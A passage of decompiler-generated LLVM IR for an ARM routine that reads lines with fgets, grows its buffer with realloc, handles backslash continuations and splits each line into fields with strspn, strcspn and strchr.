  %v2_dcdc = icmp eq i32* %arg1, null
  store i1 %v2_dcdc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_dcdc, label %dec_label_pc_dfec, label %dec_label_pc_dcf4

dec_label_pc_dcf4:                                ; preds = %entry
  %v1_dcf4 = urem i32 %arg3, 256
  store i32 %v1_dcf4, i32* @sb, align 4
  %v1_dcf8 = and i32 %arg3, ptrtoint (i32* @global_var_ff00.235 to i32)
  %v3_dcfc = udiv i32 %v1_dcf8, 256
  %v3_dd00 = mul nuw nsw i32 %v1_dcf4, 4
  %v1_dd08 = or i32 %v3_dd00, 1
  %v1_dd14 = and i32 %arg3, 131072
  %v1_dd18 = add nsw i32 %v1_dcf4, -1
  %v1_dd24 = and i32 %arg3, 262144
  store i32 %v1_dd24, i32* %r2.global-to-local, align 4
  %v1_dd28 = and i32 %arg3, 65536
  store i32 %v1_dd28, i32* %r3.global-to-local, align 4
  store i32 %v1_dd28, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_dd38 = add i32 %arg4, 1
  store i32 %v1_dd38, i32* @sl, align 4
  %v2_deb8 = inttoptr i32 %arg2 to i32*
  %v2_dec8 = icmp eq i32 %v1_dd14, 0
  %v2_df20 = icmp eq i32 %v1_dd24, 0
  br label %dec_label_pc_dd3c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dd3c.backedge, %dec_label_pc_dcf4
  %v2_dd58 = phi i32 [ %v0_dd3c.pre, %dec_label_pc_dd3c.backedge ], [ %tmp, %dec_label_pc_dcf4 ]
  %v1_dd3c = add i32 %v2_dd58, 4
  %v2_dd3c = inttoptr i32 %v1_dd3c to i32*
  %v3_dd3c = load i32, i32* %v2_dd3c, align 4
  store i32 %v3_dd3c, i32* %r3.global-to-local, align 4
  %v2_dd40 = icmp eq i32 %v3_dd3c, 0
  store i1 %v2_dd40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dd40, label %dec_label_pc_dd48, label %dec_label_pc_dd90

dec_label_pc_dd48:                                ; preds = %dec_label_pc_dd3c
  %v1_dd48 = add i32 %v2_dd58, 16
  %v2_dd48 = inttoptr i32 %v1_dd48 to i32*
  %v3_dd48 = load i32, i32* %v2_dd48, align 4
  store i32 %v3_dd48, i32* %r3.global-to-local, align 4
  %v2_dd4c = icmp eq i32 %v3_dd48, 0
  store i1 %v2_dd4c, i1* %cpsr_z.global-to-local, align 1
  %v1_dd50 = add i32 %v2_dd58, 8
  %v2_dd50 = inttoptr i32 %v1_dd50 to i32*
  %v3_dd50 = load i32, i32* %v2_dd50, align 4
  store i32 %v3_dd50, i32* %r3.global-to-local, align 4
  br i1 %v2_dd4c, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_dd48
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_dd48, align 4
  %v0_dd5c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_dd48, %bb
  %v0_dd5c = phi i32 [ %v0_dd5c.pre, %bb ], [ %v3_dd50, %dec_label_pc_dd48 ]
  %v2_dd5c = icmp eq i32 %v0_dd5c, 0
  store i1 %v2_dd5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dd5c, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_dd08, i32* %r3.global-to-local, align 4
  %v2_dd64 = load i32, i32* @r5, align 4
  %v3_dd64 = add i32 %v2_dd64, 8
  %v4_dd64 = inttoptr i32 %v3_dd64 to i32*
  store i32 %v1_dd08, i32* %v4_dd64, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_dd68 = load i32, i32* @r5, align 4
  %v1_dd68 = add i32 %v0_dd68, 16
  %v2_dd68 = inttoptr i32 %v1_dd68 to i32*
  %v3_dd68 = load i32, i32* %v2_dd68, align 4
  store i32 %v3_dd68, i32* %r0.global-to-local, align 4
  %v1_dd6c = add i32 %v0_dd68, 8
  %v2_dd6c = inttoptr i32 %v1_dd6c to i32*
  %v3_dd6c = load i32, i32* %v2_dd6c, align 4
  store i32 %v3_dd6c, i32* %r3.global-to-local, align 4
  %v2_dd70 = add i32 %v3_dd6c, %v3_dd68
  store i32 %v2_dd70, i32* %r0.global-to-local, align 4
  %v1_dd74 = call i32 @malloc(i32 %v2_dd70)
  store i32 %v1_dd74, i32* %r0.global-to-local, align 4
  %v2_dd78 = icmp eq i32 %v1_dd74, 0
  store i1 %v2_dd78, i1* %cpsr_z.global-to-local, align 1
  %v1_dd7c = load i32, i32* @r5, align 4
  %v2_dd7c = add i32 %v1_dd7c, 4
  %v3_dd7c = inttoptr i32 %v2_dd7c to i32*
  store i32 %v1_dd74, i32* %v3_dd7c, align 4
  br i1 %v2_dd78, label %dec_label_pc_dfec, label %dec_label_pc_dd84

dec_label_pc_dd84:                                ; preds = %.thread
  %v0_dd84 = load i32, i32* @r5, align 4
  %v1_dd84 = add i32 %v0_dd84, 20
  %v2_dd84 = inttoptr i32 %v1_dd84 to i32*
  %v3_dd84 = load i32, i32* %v2_dd84, align 4
  %v1_dd88 = or i32 %v3_dd84, 1
  store i32 %v1_dd88, i32* %r3.global-to-local, align 4
  store i32 %v1_dd88, i32* %v2_dd84, align 4
  %v0_dd90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dd90

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd3c, %dec_label_pc_dd84
  %v1_dd98 = phi i32 [ %v2_dd58, %dec_label_pc_dd3c ], [ %v0_dd90.pre, %dec_label_pc_dd84 ]
  %v1_dd90 = add i32 %v1_dd98, 4
  %v2_dd90 = inttoptr i32 %v1_dd90 to i32*
  %v3_dd90 = load i32, i32* %v2_dd90, align 4
  store i32 %v3_dd90, i32* %r2.global-to-local, align 4
  %v4_dd90 = add i32 %v1_dd98, 8
  %v5_dd90 = inttoptr i32 %v4_dd90 to i32*
  %v6_dd90 = load i32, i32* %v5_dd90, align 4
  %v2_dd94 = add i32 %v6_dd90, %v3_dd90
  store i32 %v2_dd94, i32* %r3.global-to-local, align 4
  %v2_dd98 = add i32 %v1_dd98, 12
  %v3_dd98 = inttoptr i32 %v2_dd98 to i32*
  store i32 %v2_dd94, i32* %v3_dd98, align 4
  %v0_dd9c = load i32, i32* @fp, align 4
  store i32 %v0_dd9c, i32* @r6, align 4
  br label %dec_label_pc_dda0

dec_label_pc_dda0:                                ; preds = %dec_label_pc_de2c, %dec_label_pc_de18, %dec_label_pc_dd90
  %v0_dda8 = phi i32 [ %v0_dd9c, %dec_label_pc_dd90 ], [ %v1_de18, %dec_label_pc_de18 ], [ %v0_dda8.pre.pre, %dec_label_pc_de2c ]
  %v0_dda0 = load i32, i32* @r5, align 4
  %v1_dda0 = add i32 %v0_dda0, 12
  store i32 %v1_dda0, i32* %r0.global-to-local, align 4
  %v1_dda4 = inttoptr i32 %v1_dda0 to i32*
  %v2_dda4 = load i32, i32* %v1_dda4, align 4
  store i32 %v2_dda4, i32* %r0.global-to-local, align 4
  %v3_dda4 = add i32 %v0_dda0, 16
  %v4_dda4 = inttoptr i32 %v3_dda4 to i32*
  %v5_dda4 = load i32, i32* %v4_dda4, align 4
  %v2_dda8 = add i32 %v2_dda4, %v0_dda8
  store i32 %v2_dda8, i32* %r0.global-to-local, align 4
  %v2_ddac = sub i32 %v5_dda4, %v0_dda8
  %v1_ddb0 = inttoptr i32 %v0_dda0 to i32*
  %v2_ddb0 = load i32, i32* %v1_ddb0, align 4
  store i32 %v2_ddb0, i32* %r2.global-to-local, align 4
  %v3_ddb4 = call i32 @fgets(i32 %v2_dda8, i32 %v2_ddac, i32 %v2_ddb0)
  store i32 %v3_ddb4, i32* %r0.global-to-local, align 4
  store i32 %v3_ddb4, i32* %r4.global-to-local, align 4
  %v2_ddb8 = icmp eq i32 %v3_ddb4, 0
  store i1 %v2_ddb8, i1* %cpsr_z.global-to-local, align 1
  %v0_ddc0 = load i32, i32* @r5, align 4
  %v1_ddc0 = add i32 %v0_ddc0, 12
  br i1 %v2_ddb8, label %dec_label_pc_ddc0, label %dec_label_pc_ddd8

dec_label_pc_ddc0:                                ; preds = %dec_label_pc_dda0
  store i32 %v1_ddc0, i32* %r0.global-to-local, align 4
  %v1_ddc4 = inttoptr i32 %v1_ddc0 to i32*
  %v2_ddc4 = load i32, i32* %v1_ddc4, align 4
  store i32 %v2_ddc4, i32* %r0.global-to-local, align 4
  %v3_ddc4 = add i32 %v0_ddc0, 16
  %v4_ddc4 = inttoptr i32 %v3_ddc4 to i32*
  %v5_ddc4 = load i32, i32* %v4_ddc4, align 4
  store i32 %v5_ddc4, i32* @r2, align 4
  %v2_ddcc = inttoptr i32 %v2_ddc4 to i8*
  %v3_ddcc = call i32 @__GI_memset(i8* %v2_ddcc, i32 0)
  store i32 %v3_ddcc, i32* %r0.global-to-local, align 4
  %v0_ddd0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_dff0

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_dda0
  %v2_ddd8 = inttoptr i32 %v1_ddc0 to i32*
  %v3_ddd8 = load i32, i32* %v2_ddd8, align 4
  store i32 %v3_ddd8, i32* @r4, align 4
  %v1_dddc = load i32, i32* @r6, align 4
  %v2_dddc = add i32 %v1_dddc, %v3_ddd8
  %v3_dddc = inttoptr i32 %v2_dddc to i8*
  store i32 %v2_dddc, i32* %r0.global-to-local, align 4
  %v3_dde0 = call i32 @strlen(i8* %v3_dddc)
  %v0_dde8 = load i32, i32* @r6, align 4
  %v2_dde8 = add i32 %v0_dde8, %v3_dde0
  store i32 %v2_dde8, i32* @r6, align 4
  %v0_ddec = load i32, i32* @r4, align 4
  store i32 %v0_ddec, i32* @r0, align 4
  %v2_ddf0 = call i32 @__GI_strchr(i32 %v0_ddec, i32 10)
  store i32 %v2_ddf0, i32* %r0.global-to-local, align 4
  %v2_ddf4 = icmp eq i32 %v2_ddf0, 0
  store i1 %v2_ddf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ddf4, label %dec_label_pc_de20, label %dec_label_pc_ddfc

dec_label_pc_ddfc:                                ; preds = %dec_label_pc_ddd8
  %v1_ddfc = inttoptr i32 %v2_ddf0 to i8*
  %v2_ddfc = load i8, i8* %v1_ddfc, align 1
  %v3_ddfc = zext i8 %v2_ddfc to i32
  %v1_de00 = add nuw nsw i32 %v3_ddfc, 255
  %v1_de04 = urem i32 %v1_de00, 256
  store i32 %v1_de04, i32* %r3.global-to-local, align 4
  %v7_de08 = icmp eq i32 %v1_de04, 92
  store i1 %v7_de08, i1* %cpsr_z.global-to-local, align 1
  %v1_de0c = trunc i32 %v1_de00 to i8
  store i8 %v1_de0c, i8* %v1_ddfc, align 1
  %v0_de10 = load i32, i32* @r6, align 4
  %v1_de10 = add i32 %v0_de10, -1
  store i32 %v1_de10, i32* @r6, align 4
  %v0_de14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_de14, label %dec_label_pc_de18, label %dec_label_pc_dea4

dec_label_pc_de18:                                ; preds = %dec_label_pc_ddfc
  %v1_de18 = add i32 %v0_de10, -2
  store i32 %v1_de18, i32* @r6, align 4
  br label %dec_label_pc_dda0

dec_label_pc_de20:                                ; preds = %dec_label_pc_ddd8
  %v0_de20 = load i32, i32* @r5, align 4
  %v1_de20 = add i32 %v0_de20, 20
  %v2_de20 = inttoptr i32 %v1_de20 to i32*
  %v3_de20 = load i32, i32* %v2_de20, align 4
  store i32 %v3_de20, i32* %r3.global-to-local, align 4
  %v2_de24 = icmp eq i32 %v3_de20, 0
  store i1 %v2_de24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_de24, label %dec_label_pc_de5c, label %dec_label_pc_de2c

dec_label_pc_de2c:                                ; preds = %dec_label_pc_de20
  %v1_de2c = add i32 %v0_de20, 16
  %v2_de2c = inttoptr i32 %v1_de2c to i32*
  %v3_de2c = load i32, i32* %v2_de2c, align 4
  store i32 %v3_de2c, i32* %r3.global-to-local, align 4
  %v1_de30 = add i32 %v0_de20, 8
  %v2_de30 = inttoptr i32 %v1_de30 to i32*
  %v3_de30 = load i32, i32* %v2_de30, align 4
  %v1_de34 = add i32 %v3_de2c, 4096
  store i32 %v1_de34, i32* %r3.global-to-local, align 4
  %v2_de38 = add i32 %v3_de30, %v1_de34
  store i32 %v1_de34, i32* %v2_de2c, align 4
  %v0_de40 = load i32, i32* @r5, align 4
  %v1_de40 = add i32 %v0_de40, 4
  %v2_de40 = inttoptr i32 %v1_de40 to i32*
  %v3_de40 = load i32, i32* %v2_de40, align 4
  store i32 %v3_de40, i32* %r0.global-to-local, align 4
  %v2_de44 = inttoptr i32 %v3_de40 to i32*
  %v3_de44 = call i32 @realloc(i32* %v2_de44, i32 %v2_de38)
  store i32 %v3_de44, i32* %r0.global-to-local, align 4
  %v0_de48 = load i32, i32* @r5, align 4
  %v1_de48 = add i32 %v0_de48, 8
  %v2_de48 = inttoptr i32 %v1_de48 to i32*
  %v3_de48 = load i32, i32* %v2_de48, align 4
  %v2_de4c = add i32 %v3_de48, %v3_de44
  store i32 %v2_de4c, i32* %r3.global-to-local, align 4
  %v2_de50 = add i32 %v0_de48, 12
  %v3_de50 = inttoptr i32 %v2_de50 to i32*
  store i32 %v2_de4c, i32* %v3_de50, align 4
  %v1_de54 = load i32, i32* @r5, align 4
  %v2_de54 = add i32 %v1_de54, 4
  %v3_de54 = inttoptr i32 %v2_de54 to i32*
  store i32 %v3_de44, i32* %v3_de54, align 4
  %v0_dda8.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dda0

dec_label_pc_de5c:                                ; preds = %dec_label_pc_de20, %.dec_label_pc_de5c_crit_edge
  %v0_de5c = phi i32 [ %v0_de5c.pre, %.dec_label_pc_de5c_crit_edge ], [ %v0_de20, %dec_label_pc_de20 ]
  %v1_de5c = inttoptr i32 %v0_de5c to i32*
  %v2_de5c = load i32, i32* %v1_de5c, align 4
  %v1_de60 = add i32 %v2_de5c, 52
  %v2_de60 = inttoptr i32 %v1_de60 to i32*
  %v3_de60 = load i32, i32* %v2_de60, align 4
  store i32 %v3_de60, i32* %r3.global-to-local, align 4
  %v2_de64 = icmp eq i32 %v3_de60, 0
  store i1 %v2_de64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_de64, label %dec_label_pc_de90, label %dec_label_pc_de6c

dec_label_pc_de6c:                                ; preds = %dec_label_pc_de5c
  %v1_de6c = add i32 %v2_de5c, 16
  %v2_de6c = inttoptr i32 %v1_de6c to i32*
  %v3_de6c = load i32, i32* %v2_de6c, align 4
  store i32 %v3_de6c, i32* %r2.global-to-local, align 4
  %v1_de70 = add i32 %v2_de5c, 24
  %v2_de70 = inttoptr i32 %v1_de70 to i32*
  %v3_de70 = load i32, i32* %v2_de70, align 4
  store i32 %v3_de70, i32* %r3.global-to-local, align 4
  %v3_de74 = icmp ult i32 %v3_de6c, %v3_de70
  %v9_de74 = icmp eq i32 %v3_de6c, %v3_de70
  store i1 %v9_de74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_de74, label %dec_label_pc_de98thread-pre-split, label %dec_label_pc_de84

dec_label_pc_de84:                                ; preds = %dec_label_pc_de6c
  store i32 %v2_de5c, i32* %r0.global-to-local, align 4
  %v1_de88 = inttoptr i32 %v2_de5c to i16*
  %v2_de88 = call i32 @getc_unlocked(i16* %v1_de88)
  store i32 %v2_de88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_de98

dec_label_pc_de90:                                ; preds = %dec_label_pc_de5c
  store i32 %v2_de5c, i32* %r0.global-to-local, align 4
  %v1_de94 = call i32 @__GI_fgetc(i32 %v2_de5c)
  store i32 %v1_de94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_de98

dec_label_pc_de98thread-pre-split:                ; preds = %dec_label_pc_de6c
  %v2_de78 = inttoptr i32 %v3_de6c to i8*
  %v3_de78 = load i8, i8* %v2_de78, align 1
  %v4_de78 = zext i8 %v3_de78 to i32
  store i32 %v4_de78, i32* %r0.global-to-local, align 4
  %v6_de78 = add i32 %v3_de6c, 1
  store i32 %v6_de78, i32* %r2.global-to-local, align 4
  store i32 %v6_de78, i32* %v2_de6c, align 4
  %v0_de98.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_de98

dec_label_pc_de98:                                ; preds = %dec_label_pc_de98thread-pre-split, %dec_label_pc_de84, %dec_label_pc_de90
  %v1_de9c = phi i32 [ %v0_de98.pr, %dec_label_pc_de98thread-pre-split ], [ %v2_de88, %dec_label_pc_de84 ], [ %v1_de94, %dec_label_pc_de90 ]
  %v7_de98 = icmp eq i32 %v1_de9c, 10
  store i1 %v7_de98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de98, label %dec_label_pc_dea4.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_de98
  %v8_de9c = icmp eq i32 %v1_de9c, -1
  store i1 %v8_de9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_de9c, label %dec_label_pc_dea4.loopexit, label %.dec_label_pc_de5c_crit_edge

.dec_label_pc_de5c_crit_edge:                     ; preds = %bb68
  %v0_de5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_de5c

dec_label_pc_dea4.loopexit:                       ; preds = %bb68, %dec_label_pc_de98
  %v0_dea4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_ddfc, %dec_label_pc_dea4.loopexit
  %v0_dea4 = phi i32 [ %v0_dea4.pre, %dec_label_pc_dea4.loopexit ], [ %v1_de10, %dec_label_pc_ddfc ]
  %v7_dea4 = icmp eq i32 %v0_dea4, -1
  store i1 %v7_dea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_dea4, label %dec_label_pc_dfec, label %dec_label_pc_deac

dec_label_pc_deac:                                ; preds = %dec_label_pc_dea4
  %v0_deac = load i32, i32* @r5, align 4
  %v1_deac = add i32 %v0_deac, 4
  %v2_deac = inttoptr i32 %v1_deac to i32*
  %v3_deac = load i32, i32* %v2_deac, align 4
  store i32 %v3_deac, i32* %r0.global-to-local, align 4
  store i32 %v3_dd00, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_deac, i32* %v2_deb8, align 4
  %v0_debc = load i32, i32* @fp, align 4
  %v2_dec0 = inttoptr i32 %v3_deac to i8*
  %v3_dec0 = call i32 @__GI_memset(i8* %v2_dec0, i32 %v0_debc)
  store i32 %v3_dec0, i32* %r0.global-to-local, align 4
  store i32 %v1_dd14, i32* %r2.global-to-local, align 4
  store i1 %v2_dec8, i1* %cpsr_z.global-to-local, align 1
  %v0_decc = load i32, i32* @r5, align 4
  %v1_decc = add i32 %v0_decc, 12
  %v2_decc = inttoptr i32 %v1_decc to i32*
  %v3_decc = load i32, i32* %v2_decc, align 4
  store i32 %v3_decc, i32* @r4, align 4
  br i1 %v2_dec8, label %dec_label_pc_dee4, label %dec_label_pc_ded4

dec_label_pc_ded4:                                ; preds = %dec_label_pc_deac
  store i32 %v3_decc, i32* @r0, align 4
  %v1_dedc = inttoptr i32 %v3_decc to i8*
  %v2_dedc = call i32 @__GI_strspn(i8* %v1_dedc)
  store i32 %v2_dedc, i32* %r0.global-to-local, align 4
  %v0_dee0 = load i32, i32* @r4, align 4
  %v2_dee0 = add i32 %v0_dee0, %v2_dedc
  store i32 %v2_dee0, i32* @r4, align 4
  br label %dec_label_pc_dee4

dec_label_pc_dee4:                                ; preds = %dec_label_pc_deac, %dec_label_pc_ded4
  %v0_dfbc13 = phi i32 [ %v3_decc, %dec_label_pc_deac ], [ %v2_dee0, %dec_label_pc_ded4 ]
  %v1_dee4 = inttoptr i32 %v0_dfbc13 to i8*
  %v2_dee4 = load i8, i8* %v1_dee4, align 1
  %v3_dee4 = zext i8 %v2_dee4 to i32
  store i32 %v3_dee4, i32* %r2.global-to-local, align 4
  %v2_dee8 = icmp eq i8 %v2_dee4, 0
  store i1 %v2_dee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dee8, label %dec_label_pc_dd3c.backedge, label %dec_label_pc_def0

dec_label_pc_dd3c.backedge:                       ; preds = %dec_label_pc_dee4, %dec_label_pc_dfe4, %dec_label_pc_def0
  %v0_dd3c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dd3c

dec_label_pc_def0:                                ; preds = %dec_label_pc_dee4
  %v0_def0 = load i32, i32* @r7, align 4
  %v1_def0 = inttoptr i32 %v0_def0 to i8*
  %v2_def0 = load i8, i8* %v1_def0, align 1
  %v3_def0 = zext i8 %v2_def0 to i32
  store i32 %v3_def0, i32* %r3.global-to-local, align 4
  %v9_def4 = icmp eq i8 %v2_def0, %v2_dee4
  store i1 %v9_def4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_def4, label %dec_label_pc_dd3c.backedge, label %dec_label_pc_dfbc.preheader

dec_label_pc_dfbc.preheader:                      ; preds = %dec_label_pc_def0
  %v1_def8 = load i32, i32* @fp, align 4
  store i32 %v1_def8, i32* @r6, align 4
  %v2_dfbc15 = load i8, i8* %v1_dee4, align 1
  %v3_dfbc16 = zext i8 %v2_dfbc15 to i32
  store i32 %v3_dfbc16, i32* %r2.global-to-local, align 4
  %v2_dfc017 = icmp eq i8 %v2_dfbc15, 0
  store i1 %v2_dfc017, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dfc017, label %dec_label_pc_dfd8, label %dec_label_pc_dfc8.preheader

dec_label_pc_dfc8.preheader:                      ; preds = %dec_label_pc_dfbc.preheader
  %v2_dfc882 = load i8, i8* %v1_def0, align 1
  %v3_dfc883 = zext i8 %v2_dfc882 to i32
  store i32 %v3_dfc883, i32* %r3.global-to-local, align 4
  %v9_dfcc86 = icmp eq i8 %v2_dfc882, %v2_dfbc15
  store i1 %v9_dfcc86, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dfcc86, label %dec_label_pc_dfd8, label %bb74

dec_label_pc_df04:                                ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_df08 = load i32, i32* %v2_deb8, align 4
  store i32 %v2_df08, i32* %r3.global-to-local, align 4
  store i32 %v1_dd18, i32* %r2.global-to-local, align 4
  %v9_df10 = icmp eq i32 %v2_df1488, %v1_dd18
  store i1 %v9_df10, i1* %cpsr_z.global-to-local, align 1
  %v5_df14 = mul i32 %v2_df1488, 4
  %v6_df14 = add i32 %v2_df08, %v5_df14
  %v7_df14 = inttoptr i32 %v6_df14 to i32*
  store i32 %v0_df1487, i32* %v7_df14, align 4
  br i1 %v9_df10, label %dec_label_pc_df1c, label %dec_label_pc_df28

dec_label_pc_df1c:                                ; preds = %dec_label_pc_df04
  store i32 %v1_dd24, i32* %r3.global-to-local, align 4
  store i1 %v2_df20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_df20, label %dec_label_pc_df28, label %dec_label_pc_df48

dec_label_pc_df28:                                ; preds = %dec_label_pc_df1c, %dec_label_pc_df04
  %v0_df28 = load i32, i32* @r7, align 4
  %v1_df28 = inttoptr i32 %v0_df28 to i8*
  %v2_df28 = load i8, i8* %v1_df28, align 1
  %v3_df28 = zext i8 %v2_df28 to i32
  store i32 %v3_df28, i32* %r3.global-to-local, align 4
  %v2_df2c = icmp eq i8 %v2_df28, 0
  store i1 %v2_df2c, i1* %cpsr_z.global-to-local, align 1
  %v0_df30 = load i32, i32* @r4, align 4
  store i32 %v0_df30, i32* @r0, align 4
  %v1_df34 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_df2c, i32 %v1_df34, i32 %v0_df28
  store i32 %storemerge, i32* @r1, align 4
  %v0_df3c = call i32 @strcspn()
  store i32 %v0_df3c, i32* %r0.global-to-local, align 4
  %v0_df40 = load i32, i32* @r4, align 4
  %v2_df40 = add i32 %v0_df40, %v0_df3c
  store i32 %v2_df40, i32* @r4, align 4
  br label %dec_label_pc_df80

dec_label_pc_df48:                                ; preds = %dec_label_pc_df1c
  %v0_df48 = load i32, i32* @r4, align 4
  store i32 %v0_df48, i32* @r0, align 4
  %v0_df4c = load i32, i32* @r7, align 4
  %v1_df4c = inttoptr i32 %v0_df4c to i8*
  %v2_df4c = load i8, i8* %v1_df4c, align 1
  %v3_df4c = zext i8 %v2_df4c to i32
  %v5_df50 = call i32 @__GI_strchrnul(i32 %v0_df48, i32 %v3_df4c, i32 %v1_dd18, i32 %v1_dd24)
  store i32 %v5_df50, i32* %r0.global-to-local, align 4
  store i32 %v1_dd14, i32* %r2.global-to-local, align 4
  store i1 %v2_dec8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_df50, i32* @r4, align 4
  br i1 %v2_dec8, label %dec_label_pc_df80, label %dec_label_pc_df6c

dec_label_pc_df68:                                ; preds = %dec_label_pc_df6c
  %v1_df68 = add i32 %v0_df80.pre, -1
  store i32 %v1_df68, i32* @r4, align 4
  br label %dec_label_pc_df6c

dec_label_pc_df6c:                                ; preds = %dec_label_pc_df48, %dec_label_pc_df68
  %v0_df6c = phi i32 [ %v1_df68, %dec_label_pc_df68 ], [ %v5_df50, %dec_label_pc_df48 ]
  %v1_df6c = add i32 %v0_df6c, -1
  %v2_df6c = inttoptr i32 %v1_df6c to i8*
  %v3_df6c = load i8, i8* %v2_df6c, align 1
  %v4_df6c = zext i8 %v3_df6c to i32
  %v0_df70 = load i32, i32* @sl, align 4
  store i32 %v0_df70, i32* @r0, align 4
  %v2_df74 = call i32 @__GI_strchr(i32 %v0_df70, i32 %v4_df6c)
  store i32 %v2_df74, i32* %r0.global-to-local, align 4
  %v2_df78 = icmp eq i32 %v2_df74, 0
  store i1 %v2_df78, i1* %cpsr_z.global-to-local, align 1
  %v0_df80.pre = load i32, i32* @r4, align 4
  br i1 %v2_df78, label %dec_label_pc_df80, label %dec_label_pc_df68

dec_label_pc_df80:                                ; preds = %dec_label_pc_df6c, %dec_label_pc_df48, %dec_label_pc_df28
  %v3_df8c = phi i32 [ %v5_df50, %dec_label_pc_df48 ], [ %v2_df40, %dec_label_pc_df28 ], [ %v0_df80.pre, %dec_label_pc_df6c ]
  %v1_df80 = inttoptr i32 %v3_df8c to i8*
  %v2_df80 = load i8, i8* %v1_df80, align 1
  %v3_df80 = zext i8 %v2_df80 to i32
  store i32 %v3_df80, i32* %r2.global-to-local, align 4
  %v0_df84 = load i32, i32* @r7, align 4
  %v1_df84 = inttoptr i32 %v0_df84 to i8*
  %v2_df84 = load i8, i8* %v1_df84, align 1
  %v3_df84 = zext i8 %v2_df84 to i32
  store i32 %v3_df84, i32* %r3.global-to-local, align 4
  %v9_df88 = icmp eq i8 %v2_df84, %v2_df80
  store i1 %v9_df88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_df88, label %bb71, label %dec_label_pc_df94

bb71:                                             ; preds = %dec_label_pc_df80
  %v1_df8c = load i32, i32* @fp, align 4
  %v2_df8c = trunc i32 %v1_df8c to i8
  store i8 %v2_df8c, i8* %v1_df80, align 1
  %v0_df90.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_df90.pr, label %bb73, label %.dec_label_pc_df94_crit_edge

.dec_label_pc_df94_crit_edge:                     ; preds = %bb71
  %v0_df94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_df94

dec_label_pc_df94:                                ; preds = %.dec_label_pc_df94_crit_edge, %dec_label_pc_df80
  %v0_df94 = phi i32 [ %v0_df94.pre, %.dec_label_pc_df94_crit_edge ], [ %v3_df80, %dec_label_pc_df80 ]
  %v2_df94 = icmp eq i32 %v0_df94, 0
  store i1 %v2_df94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_df94, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_df94
  %v1_df98 = load i32, i32* @fp, align 4
  %v2_df98 = trunc i32 %v1_df98 to i8
  %v3_df98 = load i32, i32* @r4, align 4
  %v4_df98 = inttoptr i32 %v3_df98 to i8*
  store i8 %v2_df98, i8* %v4_df98, align 1
  %v5_df98 = load i32, i32* @r4, align 4
  %v6_df98 = add i32 %v5_df98, 1
  store i32 %v6_df98, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_df94, %bb72
  %v2_df9c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_df9c, i32* %r3.global-to-local, align 4
  %v2_dfa0 = icmp eq i32 %v2_df9c, 0
  store i1 %v2_dfa0, i1* %cpsr_z.global-to-local, align 1
  %v0_dfbc.pre = load i32, i32* @r4, align 4
  br i1 %v2_dfa0, label %dec_label_pc_dfb8, label %dec_label_pc_dfa8

dec_label_pc_dfa8:                                ; preds = %bb73
  store i32 %v0_dfbc.pre, i32* @r0, align 4
  %v1_dfb0 = inttoptr i32 %v0_dfbc.pre to i8*
  %v2_dfb0 = call i32 @__GI_strspn(i8* %v1_dfb0)
  store i32 %v2_dfb0, i32* %r0.global-to-local, align 4
  %v0_dfb4 = load i32, i32* @r4, align 4
  %v2_dfb4 = add i32 %v0_dfb4, %v2_dfb0
  store i32 %v2_dfb4, i32* @r4, align 4
  br label %dec_label_pc_dfb8

dec_label_pc_dfb8:                                ; preds = %bb73, %dec_label_pc_dfa8
  %v0_dfbc = phi i32 [ %v2_dfb4, %dec_label_pc_dfa8 ], [ %v0_dfbc.pre, %bb73 ]
  %v0_dfb8 = load i32, i32* @r6, align 4
  %v1_dfb8 = add i32 %v0_dfb8, 1
  store i32 %v1_dfb8, i32* @r6, align 4
  %v1_dfbc = inttoptr i32 %v0_dfbc to i8*
  %v2_dfbc = load i8, i8* %v1_dfbc, align 1
  %v3_dfbc = zext i8 %v2_dfbc to i32
